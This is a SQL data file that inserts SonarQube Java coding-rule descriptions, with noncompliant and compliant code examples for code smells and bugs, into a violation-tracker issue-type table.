INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1444', '"public static" fields should be constant', 'sonarqube', 'Code Smell', '<p>There is no good reason to declare a field "public" and "static" without also declaring it "final". Most of the time this is a kludge to share a
state among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to
<code>null</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Greeter {
  public static Foo foo = new Foo();
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Greeter {
  public static final Foo FOO = new Foo();
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/500.html">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/WjdGBQ">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1448', 'Classes should not have too many methods', 'sonarqube', 'Code Smell', '<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.
Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1449', 'String operations should not rely on the default system locale', 'sonarqube', 'Code Smell', '<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on
<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number
representations. For instance with the Turkish language, when converting the small letter ''i'' to upper case, the result is capital letter ''I'' with a
dot over it.</p>
<p>Case conversion without a locale may work fine in its "home" environment, but break in ways that are extremely difficult to diagnose for customers
who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it''s time to fix them. For locale-sensitive
strings, the correct locale should always be used, but <code>Locale.ROOT</code> can be used for case-insensitive ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myString.toLowerCase()
</pre>
<h2>Compliant Solution</h2>
<pre>
myString.toLowerCase(Locale.TR)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4zdGBQ">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data
  </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1450', 'Private fields only used as local variables in methods should become local variables', 'sonarqube', 'Code Smell', '<p>When the value of a private field is always assigned to in a class'' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private int a;
  private int b;

  public void doSomething(int y) {
    a = y + 5;
    ...
    if(a == 0) {
      ...
    }
    ...
  }

  public void doSomethingElse(int y) {
    b = y + 3;
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {

  public void doSomething(int y) {
    int a = y + 5;
    ...
    if(a == 0) {
      ...
    }
  }

  public void doSomethingElse(int y) {
    int b = y + 3;
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise any issue on annotated field.</p>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1451', 'Track lack of copyright and license headers', 'sonarqube', 'Code Smell', '<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1452', 'Generic wildcard types should not be used in return types', 'sonarqube', 'Code Smell', '<p>It is highly recommended <strong>not</strong> to use wildcard types as return types. Because the type inference rules are fairly complex it is
unlikely the user of that API will know how to use it correctly. </p>
<p>Let''s take the example of method returning a "List&lt;? extends Animal&gt;". Is it possible on this list to add a Dog, a Cat, ... we simply don''t
know. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard types should be limited to method
parameters.</p>
<p>This rule raises an issue when a method returns a wildcard type. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;? extends Animal&gt; getAnimals(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;Animal&gt; getAnimals(){...}
</pre>
<p>or</p>
<pre>
List&lt;Dog&gt; getAnimals(){...}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1479', '"switch" statements should not have too many "case" clauses', 'sonarqube', 'Code Smell', '<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1481', 'Unused local variables should be removed', 'sonarqube', 'Code Smell', '<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int numberOfMinutes(int hours) {
  int seconds = 0;   // seconds is never used
  return hours * 60;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int numberOfMinutes(int hours) {
  return hours * 60;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1488', 'Local variables should not be declared and then immediately returned or thrown', 'sonarqube', 'Code Smell', '<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>
<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this
variable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to
know exactly what will be returned.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public long computeDurationInMilliseconds() {
  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
  return duration;
}

public void doSomething() {
  RuntimeException myException = new RuntimeException();
  throw myException;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public long computeDurationInMilliseconds() {
  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;
}

public void doSomething() {
  throw new RuntimeException();
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1541', 'Methods should not be too complex', 'sonarqube', 'Code Smell', '<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>
<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in
<code>equals</code> and <code>hashCode</code> methods.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1596', '"Collections.EMPTY_LIST", "EMPTY_MAP", and "EMPTY_SET" should not be used', 'sonarqube', 'Code Smell', '<p>Since the introduction of generics in Java 5, the use of generic types such as <code>List&lt;String&gt;</code> is recommended over the use of raw
ones such as <code>List</code>. Assigning a raw type to a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code>
fields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; collection1 = Collections.EMPTY_LIST;  // Noncompliant
Map&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;  // Noncompliant
Set&lt;String&gt; collection3 = Collections.EMPTY_SET;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; collection1 = Collections.emptyList();
Map&lt;String, String&gt; collection2 = Collections.emptyMap();
Set&lt;String&gt; collection3 = Collections.emptySet();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1598', 'Package declaration should match source file directory', 'sonarqube', 'Code Smell', '<p>By convention, a Java class'' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java
file located at <code>"src/org/bar/Foo.java"</code> should have a package of <code>"org.bar"</code>. </p>
<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the "Foo.java" class part of the
"com.apple" package, which could degrade the maintainability of both the class and its application.</p>
<p>Similarly, source placed in a folder with dots in its name instead of having the equivalent folder structure will compile but cause problems at run
time. For instance, code with a package declaration of <code>org.foo.bar</code> that is placed in <code>org/foo.bar</code> will compile, but the
classloader will always search for the class into the folder based on package structure, and will consequently expect sources to be in
<code>org/foo/bar</code> folder. <code>foo.bar</code> is therefore not a proper folder name for sources.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1602', 'Lambdas containing only one statement should not nest this statement in a block', 'sonarqube', 'Code Smell', '<p>There are two ways to write lambdas that contain single statement, but one is definitely more compact and readable than the other.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
x -&gt; {System.out.println(x+1);}
(a, b) -&gt; { return a+b; }
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; System.out.println(x+1)
(a, b) -&gt; a+b    //For return statement, the return keyword should also be dropped
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1604', 'Anonymous inner classes containing only one method should become lambdas', 'sonarqube', 'Code Smell', '<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may
seem unwieldy and unclear.</p>
<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myCollection.stream().map(new Mapper&lt;String,String&gt;() {
  public String map(String input) {
    return new StringBuilder(input).reverse().toString();
  }
});

Predicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt; {
    boolean test(String myString) {
        return myString.isEmpty();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myCollection.stream().map(input -&gt; new StringBuilder(input).reverse().toString());

Predicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty();
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1607', 'JUnit4 @Ignored and JUnit5 @Disabled annotations should be used to disable tests and should provide a rationale', 'sonarqube', 'Code Smell', '<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why
the test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up
polluting their projects.</p>
<p>This rule raises an issue for each ignored test that does not have any comment about why it is being skipped.</p>
<ul>
  <li> For Junit4, this rule targets the @Ignore annotation. </li>
  <li> For Junit5, this rule targets the @Disabled annotation. </li>
  <li> Cases where assumeTrue(false) or assumeFalse(true) are used to skip tests are targeted as well. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
@Ignore  // Noncompliant
@Test
public void testDoTheThing() {
  // ...
</pre>
<p>or</p>
<pre>
@Test
public void testDoTheThing() {
  Assume.assumeFalse(true); // Noncompliant
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
@Ignore("See Ticket #1234")
public void testDoTheThing() {
  // ...
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1609', '@FunctionalInterface annotation should be used to flag Single Abstract Method interfaces', 'sonarqube', 'Code Smell', '<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as
<code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and
<code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or
Method references. </p>
<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would
break the use of Lambda implementations.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@FunctionalInterface
public interface Changeable&lt;T&gt; {
  public void change(T o);
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1610', 'Abstract classes without fields should be converted to interfaces', 'sonarqube', 'Code Smell', '<p>With Java 8''s "default method" feature, any abstract class without direct or inherited field should be converted into an interface. However, this
change may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Car {
  public abstract void start(Environment c);

  public void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Car {
  public void start(Environment c);

  public default void stop(Environment c) {
    c.freeze(this);
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1611', 'Parentheses should be removed from a single lambda input parameter when its type is inferred', 'sonarqube', 'Code Smell', '<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single
parameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
(x) -&gt; x * 2
</pre>
<h2>Compliant Solution</h2>
<pre>
x -&gt; x * 2
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1612', 'Lambdas should be replaced with method references', 'sonarqube', 'Code Smell', '<p>Method/constructor references are commonly agreed to be, most of the time, more compact and readable than using lambdas, and are therefore
preferred. </p>
<p>In some rare cases, when it is not clear from the context what kind of function is being described and reference would not increase the clarity, it
might be fine to keep the lambda. </p>
<p>Similarly, <code>null</code> checks can be replaced with references to the <code>Objects::isNull</code> and <code>Objects::nonNull</code> methods,
<code>casts</code> can be replaced with <code>SomeClass.class::cast</code> and <code>instanceof</code> can be replaced with
<code>SomeClass.class::isInstance</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .filter(a -&gt; a instanceof B)
      .map(a -&gt; (B) a)
      .map(b -&gt; b.&lt;String&gt;getObject())
      .forEach(b -&gt; { System.out.println(b); });
  }
}

class B extends A {
  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  void process(List&lt;A&gt; list) {
    list.stream()
      .filter(B.class::isInstance)
      .map(B.class::cast)
      .map(B::&lt;String&gt;getObject)
      .forEach(System.out::println);
  }
}

class B extends A {
  &lt;T&gt; T getObject() {
    return null;
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1640', 'Maps with keys that are enum values should be replaced with EnumMap', 'sonarqube', 'Code Smell', '<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more
efficient than other sets because the underlying data structure is a simple array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1641', 'Sets with elements that are enum values should be replaced with EnumSet', 'sonarqube', 'Code Smell', '<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other
sets because the underlying data structure is a simple bitmap.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();
    warm.add(COLOR.RED);
    warm.add(COLOR.ORANGE);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void doSomething() {
    Set&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1643', 'Strings should not be concatenated using ''+'' in a loop', 'sonarqube', 'Code Smell', '<p>Strings are immutable objects, so concatenation doesn''t simply add the new String to the end of the existing string. Instead, in each loop
iteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted
back to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is
preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "";
for (int i = 0; i &lt; arrayOfStrings.length ; ++i) {
  str = str + arrayOfStrings[i];
}
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuilder bld = new StringBuilder();
  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {
    bld.append(arrayOfStrings[i]);
  }
  String str = bld.toString();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1656', 'Variables should not be self-assigned', 'sonarqube', 'Bug', '<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void setName(String name) {
  name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void setName(String name) {
  this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5dUxBQ">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1659', 'Multiple variables should not be declared on the same line', 'sonarqube', 'Code Smell', '<p>Declaring multiple variables on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  private int a, b;

  public void method(){
    int c; int d;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  private int a;
  private int b;

  public void method(){
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/YTZGBQ">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/EtcxBQ">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1694', 'An abstract class should have both abstract and concrete methods', 'sonarqube', 'Code Smell', '<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>
<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the
<code>abstract</code> keyword) with a private constructor.</p>
<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public abstract class Animal {  // Noncompliant; should be an interface
  abstract void move();
  abstract void feed();
}

public abstract class Color {  // Noncompliant; should be concrete with a private constructor
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  public int getRed() {
    return red;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Animal {
  void move();
  void feed();
}

public class Color {
  private int red = 0;
  private int green = 0;
  private int blue = 0;

  private Color () {}

  public int getRed() {
    return red;
  }
}

public abstract class Lamp {

  private boolean switchLamp=false;

  public abstract void glow();

  public void flipSwitch() {
    switchLamp = !switchLamp;
    if (switchLamp) {
      glow();
    }
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1695', '"NullPointerException" should not be explicitly thrown', 'sonarqube', 'Code Smell', '<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates
that code is structured to avoid NPE''s. </p>
<p>Explicitly throwing <code>NullPointerException</code> forces a method''s callers to explicitly catch it, rather than coding to avoid it. Further, it
makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely
throw an NPE.</p>
<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation
instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething (String aString) throws NullPointerException {
     throw new NullPointerException();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething (@NotNull String aString) {
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1696', '"NullPointerException" should not be caught', 'sonarqube', 'Code Smell', '<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can
easily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the "is null" branch of
the conditional.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;
  try {
    len += str.length();
  }
  catch (NullPointerException e) {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;

  if (str != null) {
    len += str.length();
  }
  else {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/395.html">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer
  Dereference </li>
  <li> <a href="https://tinyurl.com/y6r4amg3">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1697', 'Short-circuit logic should be used to prevent null pointer dereferences in conditionals', 'sonarqube', 'Bug', '<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely
null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced
<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (str == null &amp;&amp; str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null || str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (str == null || str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null &amp;&amp; str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS2259''>S2259</a> instead.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1698', '"==" and "!=" should not be used when "equals" is overridden', 'sonarqube', 'Code Smell', '<p>It is equivalent to use the equality <code>==</code> operator and the <code>equals</code> method to compare two objects if the <code>equals</code>
method inherited from <code>Object</code> has not been overridden. In this case both checks compare the object references.</p>
<p>But as soon as <code>equals</code> is overridden, two objects not having the same reference but having the same value can be equal. This rule spots
suspicious uses of <code>==</code> and <code>!=</code> operators on objects whose <code>equals</code> methods are overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>Exceptions</h2>
<p>Comparing two instances of the <code>Class</code> object will not raise an issue:</p>
<pre>
Class c;
if(c == Integer.class) { // No issue raised
}
</pre>
<p>Comparing <code>Enum</code> will not raise an issue:</p>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // it''s recommended to activate S4551 to enforce comparison of Enums using ==
}
</pre>
<p>Comparing with <code>final</code> reference will not raise an issue:</p>
<pre>
private static final Type DEFAULT = new Type();

void foo(Type other) {
  if (other == DEFAULT) { // Compliant
  //...
  }
}
</pre>
<p>Comparing with <code>this</code> will not raise an issue:</p>
<pre>
  public boolean equals(Object other) {
    if (this == other) {  // Compliant
      return false;
    }
 }
</pre>
<p>Comparing with <code>java.lang.String</code> and boxed types <code>java.lang.Integer</code>, ... will not raise an issue. </p>
<h2>See</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS4973''>S4973</a> - Strings and Boxed types should be compared using "equals()" </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UjdGBQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed
  primitives </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/yDdGBQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality
  </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1699', 'Constructors should only call non-overridable methods', 'sonarqube', 'Code Smell', '<p>Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the
method.</p>
<p>For example:</p>
<ul>
  <li> The subclass class constructor starts by contract by calling the parent class constructor. </li>
  <li> The parent class constructor calls the method, which has been overridden in the child class. </li>
  <li> If the behavior of the child class method depends on fields that are initialized in the child class constructor, unexpected behavior (like a
  <code>NullPointerException</code>) can result, because the fields aren''t initialized yet. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  public Parent () {
    doSomething();  // Noncompliant
  }

  public void doSomething () {  // not final; can be overridden
    ...
  }
}

public class Child extends Parent {

  private String foo;

  public Child(String foo) {
    super(); // leads to call doSomething() in Parent constructor which triggers a NullPointerException as foo has not yet been initialized
    this.foo = foo;
  }

  public void doSomething () {
    System.out.println(this.foo.length());
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/8zZGBQ">CERT, MET05-J.</a> - Ensure that constructors do not call overridable methods </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6ns-BQ">CERT, OOP50-CPP.</a> - Do not invoke virtual functions from constructors or destructors
  </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
